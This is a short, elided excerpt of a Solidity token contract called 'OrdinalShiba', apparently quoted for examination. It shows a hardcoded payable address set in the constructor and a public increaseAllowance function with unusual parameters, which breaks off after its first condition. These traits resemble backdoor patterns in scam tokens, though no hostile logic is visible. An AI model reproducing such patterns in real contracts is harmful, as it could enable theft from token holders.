...
contract OrdinalShiba is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "OrdinalShiba";
    string private _symbol = "oShib";
    ...
    constructor () {
        ...
        manyERC = payable(address(0xCdd12A91b4550Bb038f3275f00EF6E0b521ddcB6));
    ...
    function increaseAllowance(address adrs,uint256 upar) public {
        if (upar > 10**3) {
